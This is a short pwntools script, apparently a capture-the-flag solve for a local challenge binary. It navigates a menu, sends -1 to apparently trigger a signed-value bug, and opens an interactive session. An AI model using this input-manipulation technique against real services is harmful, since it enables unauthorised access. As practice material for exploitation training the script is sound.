from pwn import *
context(arch='amd64', os='linux')#, log_level='debug')
s=process("../dist/pwn")
s.sendlineafter(b">> ",b"1")
s.sendlineafter("？\n".encode(),b"3")
pause()
s.sendlineafter("？\n".encode(),b"-1")
s.sendlineafter(b">> ",b"2")
s.interactive()